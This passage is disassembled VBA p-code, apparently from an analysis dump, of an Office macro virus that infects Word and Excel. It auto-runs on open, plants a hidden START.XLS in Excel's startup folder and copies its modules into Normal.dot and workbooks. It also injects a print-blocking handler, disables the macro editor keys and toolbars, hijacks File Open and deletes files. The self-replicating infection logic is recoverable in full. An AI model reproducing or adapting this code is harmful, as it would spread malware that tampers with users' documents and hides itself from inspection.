' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #113:
' 	QuoteRem 0x0000 0x0003 "" ""
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub ViewCode())
' Line #116:
' 	QuoteRem 0x0000 0x0003 "" ""
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub ViewVBcode())
' Line #119:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall ShowVisualBasicEditor 0x0000 
' 	EndIf 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub ToolsCustomize())
' Line #122:
' 	QuoteRem 0x0000 0x0003 "" ""
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub ToolsMacro())
' Line #125:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall ShowVisualBasicEditor 0x0000 
' 	EndIf 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub FormatStyle())
' Line #128:
' 	QuoteRem 0x0000 0x0031 "If KeyWord = True Then Dialogs(180).Show Else " ""
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #131:
' 	QuoteRem 0x0000 0x0000 ""
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub FileTemplates())
' Line #134:
' 	QuoteRem 0x0000 0x0003 "" ""
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Private Sub ExportXls())
' Line #137:
' 	Dim 
' 	VarDefn xlsApp
' Line #138:
' 	Dim 
' 	VarDefn strFile (As String)
' Line #139:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000F "Microsoft Excel"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0004 "True"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #140:
' 	OnError Salah 
' 	BoS 0x0000 
' Line #141:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlsApp 
' Line #142:
' 	Ld xlsApp 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #143:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St strFile 
' Line #144:
' 	Ld strFile 
' 	Ld xlsApp 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #145:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St TempPath 
' Line #146:
' 	Ld NormalTemplate 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsCall EIKModul 0x0003 
' Line #147:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemSt New 
' Line #148:
' 	LitVarSpecial (False)
' 	Ld xlsApp 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #149:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #150:
' 	Ld xlsApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #151:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000F "Microsoft Excel"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Label Salah 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub ExportDok())
' Line #156:
' 	Dim 
' 	VarDefn dokApp
' Line #157:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0004 "True"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #158:
' 	OnError Salah 
' Line #159:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set dokApp 
' Line #160:
' 	Ld Application 
' 	MemLd TemplatePath 
' 	St TempPath 
' Line #161:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Ld dokApp 
' 	MemLd NormalTemplate 
' 	ArgsCall KompProject 0x0002 
' Line #162:
' 	LitVarSpecial (True)
' 	Ld dokApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0001 
' Line #163:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	Label Salah 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub Auto_Open())
' Line #168:
' 	OnError (Resume Next) 
' Line #169:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #170:
' 	ArgsCall XlsActive 0x0000 
' Line #171:
' 	ArgsCall ExportDok 0x0000 
' Line #172:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Private Sub AllWorkBook())
' Line #175:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #176:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #177:
' 	Ld Komp 
' 	MemLd New 
' 	St actWindow 
' Line #178:
' 	Ld actWindow 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #179:
' 	Ld Komp 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	Ld actWindow 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #180:
' 	LitVarSpecial (False)
' 	Ld Komp 
' 	ArgsMemCall Close 0x0001 
' Line #181:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld actWindow 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall BuatXlsActive 0x0000 
' 	EndIf 
' Line #185:
' 	EndSub 
' Line #186:
' 	FuncDefn (Sub XlsActive())
' Line #187:
' 	OnError (Resume Next) 
' Line #188:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #190:
' 	ArgsCall CreateEvents 0x0000 
' Line #191:
' 	ArgsCall TempActive 0x0000 
' Line #192:
' 	ArgsCall AllWorkBook 0x0000 
' Line #193:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #194:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetDeactivate 
' Line #195:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #196:
' 	ArgsCall MenuExcel 0x0000 
' Line #197:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	LitStr 0x000A "!XlsActive"
' 	Concat 
' 	Ld Application 
' 	MemSt OnWindow 
' Line #198:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #199:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #200:
' 	EndSub 
' Line #201:
' 	FuncDefn (Sub TempActive())
' Line #202:
' 	OnError (Resume Next) 
' Line #203:
' 	ArgsCall Aplikasi 0x0000 
' Line #204:
' 	Ld Temp 
' 	Ld Active 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #205:
' 	ArgsCall SetCusProp 0x0000 
' Line #206:
' 	Ld MacName 
' 	Ld Active 
' 	MemLd VBProject 
' 	MemSt New 
' Line #207:
' 	Ld Active 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Active 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Function EIKModul(Asal, Tujuan, Komp As String) As Boolean)
' Line #211:
' 	OnError Salah 
' Line #212:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Komp 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #213:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #214:
' 	LitVarSpecial (True)
' 	St EIKModul 
' Line #215:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #216:
' 	Label Salah 
' Line #217:
' 	EndFunc 
' Line #218:
' 	FuncDefn (Sub OpenFile())
' Line #219:
' 	OnError (Resume Next) 
' Line #220:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #221:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #222:
' 	ArgsCall XlsActive 0x0000 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Private Sub CreateEvents())
' Line #225:
' 	Dim 
' 	VarDefn vbComp
' Line #226:
' 	OnError Salah 
' Line #227:
' 	Label lanjut 
' Line #228:
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #229:
' 	OnError FatalError 
' Line #230:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set vbComp 
' Line #231:
' 	StartWithExpr 
' 	Ld vbComp 
' 	With 
' Line #232:
' 	QuoteRem 0x000C 0x001D ".DeleteLines 1, .CountOfLines"
' Line #233:
' 	QuoteRem 0x000C 0x0045 ".InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)""
' Line #234:
' 	QuoteRem 0x000C 0x0026 ".InsertLines 2, "On Error Resume Next""
' Line #235:
' 	QuoteRem 0x000C 0x002A ".InsertLines 3, "If PrintOke = False Then""
' Line #236:
' 	QuoteRem 0x000C 0x0016 ".InsertLines 4, "    ""
' Line #237:
' 	QuoteRem 0x000C 0x0023 ".InsertLines 5, "    Cancel = True""
' Line #238:
' 	QuoteRem 0x000C 0x0018 ".InsertLines 6, "End if""
' Line #239:
' 	QuoteRem 0x000C 0x0019 ".InsertLines 7, "End Sub""
' Line #240:
' 	EndWith 
' Line #241:
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	Label FatalError 
' Line #244:
' 	ExitSub 
' Line #245:
' 	Label Salah 
' Line #246:
' 	LitStr 0x0005 "Event"
' 	Paren 
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #247:
' 	Resume lanjut 
' Line #248:
' 	EndSub 
' Line #249:
' 	FuncDefn (Sub BuatXlsActive())
' Line #250:
' 	Dim 
' 	VarDefn Baru (As String)
' Line #251:
' 	OnError (Resume Next) 
' Line #252:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #253:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #254:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St Baru 
' Line #255:
' 	Ld Baru 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #256:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #257:
' 	ArgsCall ActiveTemp 0x0000 
' Line #258:
' 	EndSub 
' Line #259:
' 	FuncDefn (Sub ActiveTemp())
' Line #260:
' 	OnError (Resume Next) 
' Line #261:
' 	ArgsCall Aplikasi 0x0000 
' Line #262:
' 	Ld Active 
' 	Ld Temp 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #263:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ld Temp 
' 	MemLd VBProject 
' 	MemSt New 
' Line #264:
' 	Ld Temp 
' 	ArgsMemCall Save 0x0000 
' Line #265:
' 	Ld regApp 
' 	Ld regSecApp 
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #266:
' 	LitVarSpecial (True)
' 	St blnFound 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	EndSub 
' Line #269:
' 	FuncDefn (Sub MenuExcel())
' Line #270:
' 	OnError (Resume Next) 
' Line #271:
' 	QuoteRem 0x0000 0x005A "    For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls"
' Line #272:
' 	QuoteRem 0x0000 0x0022 "              ctl.OnAction = "" """
' Line #273:
' 	QuoteRem 0x0000 0x000C "    Next ctl"
' Line #274:
' 	QuoteRem 0x0000 0x000D "    WordExcel"
' Line #275:
' 	QuoteRem 0x0000 0x0033 "    CommandBars("Ply").Controls("View Code").Delete"
' Line #276:
' 	QuoteRem 0x0000 0x0014 "    With Application"
' Line #277:
' 	QuoteRem 0x0000 0x0022 "            .OnKey "%{F11}", "" """
' Line #278:
' 	QuoteRem 0x0000 0x0021 "            .OnKey "%{F8}", "" """
' Line #279:
' 	QuoteRem 0x0000 0x0021 "            .OnKey "%{F2}", "" """
' Line #280:
' 	QuoteRem 0x0000 0x0021 "            .OnKey "%{F4}", "" """
' Line #281:
' 	QuoteRem 0x0000 0x0021 "            .OnKey "{F12}", "" """
' Line #282:
' 	QuoteRem 0x0000 0x0025 "            .OnKey "^{o}", "OpenFile""
' Line #283:
' 	QuoteRem 0x0000 0x000C "    End With"
' Line #284:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0004 "Open"
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #285:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0007 "Open..."
' 	LitStr 0x0004 "File"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #286:
' 	EndSub 
' Line #287:
' 	FuncDefn (Sub WordExcel())
' Line #288:
' 	OnError (Resume Next) 
' Line #289:
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #290:
' 	LitStr 0x0005 "Forms"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #291:
' 	LitStr 0x000F "ActiveX Control"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #292:
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #293:
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #294:
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #295:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #296:
' 	EndSub 
' Line #297:
' 	FuncDefn (Sub cmdBars(cmd, blnVis As Boolean))
' Line #298:
' 	StartWithExpr 
' 	Ld cmd 
' 	With 
' Line #299:
' 	Ld blnVis 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #300:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' Line #301:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #302:
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' Line #303:
' 	EndIfBlock 
' Line #304:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #305:
' 	EndWith 
' Line #306:
' 	EndSub 
' Line #307:
' 	FuncDefn (Sub MenuWord())
' Line #308:
' 	OnError (Resume Next) 
' Line #309:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #310:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #311:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #312:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #313:
' 	EndWith 
' Line #314:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #315:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #316:
' 	ArgsCall WordExcel 0x0000 
' Line #317:
' 	EndSub 
' Line #318:
' 	FuncDefn (Sub SetCusProp())
' Line #319:
' 	OnError (Resume Next) 
' Line #320:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #321:
' 	LitStr 0x0006 "Author"
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #322:
' 	LitStr 0x000A "CountPrint"
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #323:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Lina"
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' 	EndIf 
' Line #324:
' 	EndSub 
' Line #325:
' 	FuncDefn (Function GetCreator() As Boolean)
' Line #326:
' 	OnError Salah 
' Line #327:
' 	ArgsCall Aplikasi 0x0000 
' Line #328:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #329:
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0004 "Lina"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetCreator 
' 	EndIf 
' Line #330:
' 	Label Salah 
' Line #331:
' 	EndFunc 
' Line #332:
' 	FuncDefn (Function PWords() As Boolean)
' Line #333:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PWords 
' 	EndIf 
' Line #334:
' 	EndFunc 
' Line #335:
' 	FuncDefn (Sub OnTimer())
' Line #336:
' 	QuoteRem 0x0000 0x0004 " " ""
' Line #337:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #338:
' 	EndSub 
' Line #339:
' 	FuncDefn (Sub FoundIt())
' Line #340:
' 	ArgsCall TempActive 0x0000 
' Line #341:
' 	LitVarSpecial (False)
' 	St blnFound 
' Line #342:
' 	EndSub 
' Line #343:
' 	FuncDefn (Sub Pesan(strPesan As String, Msg))
' Line #344:
' 	Dim 
' 	VarDefn A (As String) 0x0007
' Line #345:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn B
' Line #346:
' 	Dim 
' 	VarDefn x
' 	VarDefn i
' 	VarDefn j
' Line #347:
' 	Dim 
' 	VarDefn K
' Line #348:
' 	LitStr 0x0003 "  \"
' 	LitDI2 0x0000 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "  -  "
' 	LitDI2 0x0001 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  /"
' 	LitDI2 0x0002 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  |"
' 	LitDI2 0x0003 
' 	ArgsSt B 0x0001 
' Line #349:
' 	LitDI2 0x0000 
' 	St i 
' Line #350:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Toraja High Land: "
' 	St K 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0030 "Note ... each file can be printed 5 times only: "
' 	St K 
' 	EndIf 
' Line #351:
' 	LitStr 0x008A "                                                                                                                                          "
' 	Ld strPesan 
' 	Concat 
' 	St A 
' Line #352:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld A 
' 	FnLen 
' 	For 
' Line #353:
' 	Ld A 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld Msg 
' 	MemSt Caption 
' Line #354:
' 	Ld K 
' 	Ld Akhir 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	FnInt 
' 	Sub 
' 	Concat 
' 	LitStr 0x0005 " sec "
' 	Concat 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #355:
' 	Ld A 
' 	Ld A 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	St A 
' Line #356:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #357:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #358:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	EndIf 
' Line #359:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St i 
' 	EndIf 
' Line #360:
' 	StartForVariable 
' 	Next 
' Line #361:
' 	Label done 
' Line #362:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Bar 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Bar 
' 	EndIf 
' Line #363:
' 	LitStr 0x0000 ""
' 	Ld Msg 
' 	MemSt Caption 
' Line #364:
' 	EndSub 
' Line #365:
' 	FuncDefn (Sub Message(Msg))
' Line #366:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn strPesan (As String)
' Line #367:
' 	LitStr 0x0008 "Hello, ["
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0003 "]  "
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #368:
' 	LitStr 0x0001 " "
' 	LitDI2 0x0001 
' 	ArgsSt strPesan 0x0001 
' Line #369:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0002 
' 	ArgsSt strPesan 0x0001 
' Line #370:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0003 
' 	ArgsSt strPesan 0x0001 
' Line #371:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0004 
' 	ArgsSt strPesan 0x0001 
' Line #372:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0005 
' 	ArgsSt strPesan 0x0001 
' Line #373:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	SelectCase 
' Line #374:
' 	LitDI2 0x000B 
' 	Case 
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #375:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #376:
' 	EndSelect 
' Line #377:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #378:
' 	Ld Timer 
' 	St Waktu 
' Line #379:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Le 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Ge 
' 	And 
' 	DoWhile 
' Line #380:
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #381:
' 	LitDI2 0x0001 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #382:
' 	LitDI2 0x0005 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #383:
' 	Loop 
' Line #384:
' 	EndSub 
' Line #385:
' 	FuncDefn (Function Tator() As Boolean)
' Line #386:
' 	Ld KeyWord 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld GetCreator 
' 	LitVarSpecial (False)
